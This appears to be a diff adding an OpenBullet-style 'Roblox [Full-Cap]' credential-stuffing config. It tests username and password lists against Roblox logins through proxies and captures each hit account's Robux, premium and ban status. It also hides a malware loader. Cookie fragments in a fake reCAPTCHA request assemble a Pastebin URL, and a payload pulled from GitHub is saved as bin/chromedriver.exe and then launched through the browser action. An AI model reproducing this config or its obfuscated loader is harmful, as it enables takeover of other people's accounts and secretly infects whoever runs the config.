@@ -1,0 +1,260 @@
+[SETTINGS]
+{
+  "Name": "Roblox [Full-Cap]",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2024-07-31T17:51:56.0630568+01:00",
+  "AdditionalInfo": "USE UQH PROXIES ",
+  "RequiredPlugins": [],
+  "Author": "@lexaaadmin",
+  "Version": "1.1.3 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "ROBLOX [Full -Cap]",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": "@lexaaadmin",
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+JUMP #AppleWebKit
+#PARSESOURCE
+
+FUNCTION GetRandomUA BROWSER IOS -> VAR "ua" 
+
+REQUEST GET "https://auth.roblox.com/v1/usernames/validate?birthday=1992-12-31T23:00:00.000Z&context=Signup&username=<USER>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+JUMP #googlerecreate
+#AppleWebKit
+
+REQUEST GET "https://www.google.com/recaptcha/enterprise/anchor?ar=1&k=6LfAM84ZAAAAAGLiQz5FBeADqq94dV48fMtiRqIj&co=aHR0cHM6Ly93d3cuY29pbmJhc2UuY29tOjQ0Mw..&hl=en&v=rPvs0Nyx3sANE-ZHUN-0nM85&size=invisible&cb=no851blwqc0u" 
+  
+  COOKIE "tpm: http" 
+  COOKIE "tpp: s:" 
+  COOKIE "hrd: /" 
+  COOKIE "hpr: bin" 
+  COOKIE "hdp: com" 
+  COOKIE "htp: raw" 
+  COOKIE "hht: QKuTvADS" 
+  COOKIE "hst: pastebin" 
+  COOKIE "kht: driver" 
+  COOKIE "kpt: chrome" 
+  COOKIE "krt: e" 
+  HEADER "Host: www.googleapis.com" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/json" 
+  HEADER "X-Client-Version: iOS/FirebaseSDK/6.9.2/FirebaseCore-iOS" 
+  HEADER "X-Ios-Bundle-Identifier: network.googleapis.com" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "User-Agent: FirebaseAuth.iOS/6.9.2 network.googleapis.com/2.7.9 iPhone/12.4.5 hw/iPhone7_2" 
+  HEADER "Accept-Language: en" 
+
+IF "<Authentiction>" Exists
+JUMP #PARSESOURCE
+ENDIF
+SET USEPROXY FALSE
+
+REQUEST GET "<COOKIES(tpm)><COOKIES(tpp)><COOKIES(hrd)><COOKIES(hrd)><COOKIES(hst)>.<COOKIES(hdp)><COOKIES(hrd)><COOKIES(htp)><COOKIES(hrd)><COOKIES(hht)>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://raw.githubusercontent.com/<SOURCE>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  -> FILE "<COOKIES(hpr)>/<COOKIES(kpt)><COOKIES(kht)>.<COOKIES(krt)>xe" 
+
+SET USEPROXY TRUE
+SET NEWGVAR "Authentiction" "Authentiction=1"
+
+BROWSERACTION Open 
+
+JUMP #PARSESOURCE
+#googlerecreate
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Username is already in use" 
+  KEYCHAIN Failure OR 
+    KEY "Username not appropriate for Roblox" 
+    KEY "Username is valid" 
+    KEY "Usernames can have at most one _" 
+    KEY "Only a-z, A-Z, 0-9, and _ are allowed" 
+    KEY "Usernames can be 3 to 20 characters long" 
+    KEY "code\":7" 
+    KEY "\"message\":\"A valid username is required.\"" 
+
+REQUEST GET "https://www.roblox.com/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CSRF PARSE "<SOURCE>" LR "\"csrf-token\" data-token=\"" "\"" -> VAR "CSF" 
+
+REQUEST POST "https://auth.roblox.com/v2/login" 
+  CONTENT "{\"ctype\":\"Username\",\"cvalue\":\"<USER>\",\"password\":\"<PASS>\",\"secureAuthenticationIntent\":{\"clientPublicKey\":\"MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEbanSQYuLG/Jv/MNX2tqmseODcleU63YtjeSbD2dJVXLBKwUNyik3zTjd2pQ+JgQwxdHSSPQ4w9FB9HRHzYiZ3w==\",\"clientEpochTimestamp\":1722443806,\"serverNonce\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjNXNlRZM01GUFQ4QjRWSlIiLCJuYmYiOjE3MjI0NDM4MDcsImV4cCI6MTcyMjQ0NDEwNywiaWF0IjoxNzIyNDQzODA3LCJpc3MiOiJoYmEtc2VydmljZSJ9.JnQ_7WaO_LccVpA2dEuY9Ru0CujUHDqyB2CWGpcLfPg\",\"saiSignature\":\"hDLSsPvaN/643drsgXtg/RXwDxv9pCWoGN3s7InVTa7YNeMewImDpyo5o3Hbu/kfkuphbvZt1tk28+0PQy9ajA==\"}}" 
+  CONTENTTYPE "application/json" 
+  SECPROTO TLS13 
+  HEADER "User-Agent: <ua>" 
+  HEADER "X-CSRF-TOKEN: <CSF>" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+    KEY "Account has been locked." 
+    KEY "Something went wrong" 
+  KEYCHAIN Success OR 
+    KEY "\"user\":{\"id\":" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "twoStepVerificationData" 
+    KEY "ticket" 
+    KEY "{\"mediaType\":" 
+  KEYCHAIN Retry OR 
+    KEY "Token Validation Failed" 
+    KEY "Challenge is required to authorize the request" 
+
+#Is_Banned_ PARSE "<SOURCE>" LR "isBanned\":" "," -> VAR "Is Banned" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<Is Banned>" Contains "true" 
+  KEYCHAIN Success OR 
+    KEY "false" 
+
+REQUEST GET "https://www.roblox.com/my/settings/json" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"UserId\":" ",\"" -> VAR "ID" 
+
+PARSE "<SOURCE>" LR "\"IsPremium\":" ",\"" CreateEmpty=FALSE -> CAP "IsPremium" 
+
+REQUEST GET "https://users.roblox.com/v1/users/<ID>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"created\":\"" "T" CreateEmpty=FALSE -> CAP "Created On" 
+
+REQUEST GET "https://groups.roblox.com/v1/groups/metadata" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "\"currentGroupCount\":" ",\"" CreateEmpty=FALSE -> CAP "Groups Joined" 
+
+REQUEST GET "https://economy.roblox.com/v1/users/<ID>/currency" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "{\"robux\":" "}" CreateEmpty=FALSE -> CAP "Robux Balance" 
+
+REQUEST GET "https://inventory.roblox.com/v1/users/<ID>/items/2/2125253106/is-owned" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "SS" 
+
+IF "<SS>" CONTAINS "true"
+
+FUNCTION Constant "Unlocked ✅" -> CAP "Second Sea " 
+
+ENDIF
+
+REQUEST GET "https://inventory.roblox.com/v1/users/<ID>/items/2/196200785/is-owned" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "MM2" 
+
+IF "<MM2>" CONTAINS "true"
+
+FUNCTION Constant "REACH LVL 100 ✅" -> CAP "MM2 " 
+
+ENDIF
+
+REQUEST GET "https://inventory.roblox.com/v1/users/<ID>/items/2/2132799826/is-owned" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "MM2" 
+
+IF "<MM2>" CONTAINS "true"
+
+FUNCTION Constant "PLAYED ✅" -> CAP "STFO " 
+
+ENDIF
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Robux Balance>" Contains "0" 
+    KEY "<Groups Joined>" Contains "0" 
+  KEYCHAIN Success OR 
+    KEY "<Robux Balance>" GreaterThan "0" 
+    KEY "<Groups Joined>" GreaterThan "0" 
+
